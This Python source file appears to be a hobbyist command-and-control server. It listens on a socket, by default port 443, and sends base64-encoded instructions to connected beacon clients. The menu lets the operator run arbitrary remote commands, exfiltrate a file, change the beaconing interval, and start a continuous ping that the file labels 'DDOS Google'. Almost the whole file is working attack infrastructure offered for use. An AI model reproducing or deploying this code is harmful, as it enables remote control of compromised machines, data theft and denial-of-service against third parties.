import socketserver  
import base64
import time
from cryptography.fernet import Fernet


class TCPHandler(socketserver.BaseRequestHandler):
    """This class handles TCP requests and sends back commands from those requests
    """

    def handle(self):
        self.connection_data = self.request.recv(2048).strip().decode('utf-8')
        print("\nReceived connection from {}:{}".format(self.client_address[0], self.connection_data))

        self.menu_input()

        # Run a command
        if self.option == "1":
            # Get command from user and encode
            self.command = input("Enter command: ")

            # Send command and decode results of the command
            self.encode_send()
            self.receive_decode()
            print(self.received_data)
            
        # Exfil text file
        elif self.option == "2":
            self.command = "type test.txt"
            self.encode_send() 
            
            self.received_data = self.request.recv(2048).strip().decode('utf-8')

            f = open("testexfil.txt", "a")
            f.write("\n" + self.received_data)
            f.close()
            print("testexfil.txt exfiltrated")

            #key = Fernet.generate_key()
            #with open("key.key", "wb") as key_file:
            #    key_file.write(key) # if key exists, open("key.key", "rb").read()
            # https://www.thepythoncode.com/article/encrypt-decrypt-files-symmetric-python

        # change beaconing interval
        elif self.option == "3":

            min = input("Minimum beaconing interval (seconds): ")
            max = input("Maximum beaconing interval (seconds): ")
            
            # error correction
            if int(max) >= int(min):
                # Tell the client we are changing the interval
                self.command = "INTERVAL"
                self.encode_send()
                time.sleep(.5)
                self.request.sendall(bytes(min, "utf-8"))
                self.request.sendall(bytes(max, "utf-8"))
            else:
                print("Please enter a valid min and max")
        
        elif self.option == "4":
            self.command = "PING"
            self.encode_send()
            print("Pinging 8.8.8.8")
            
        else:
            self.command = "exit"
            self.encode_send()

    def menu_input(self):
        self.option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 

    def encode_send(self):
        self.encodedcommand = base64.b64encode(self.command.encode("utf-8")).decode("utf-8")
        self.request.sendall(bytes(self.encodedcommand, "utf-8"))

    def receive_decode(self):
        self.received_data = self.request.recv(2048).strip().decode('utf-8')


if __name__ == "__main__":
    HOST = input("Listener interface (default: localhost): ")
    if HOST == "":
        HOST = "localhost"
    PORT = input("Listener port (default: 443): ")
    if PORT == "":
        PORT = 443

    # Create the server, binding to localhost on port 443
    with socketserver.TCPServer((HOST, PORT), TCPHandler) as server:
        # Activates the server until terminated with ctrl-c
        try:
            print(f"C2 server listening on {HOST}:{PORT}")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nC2 server terminated.")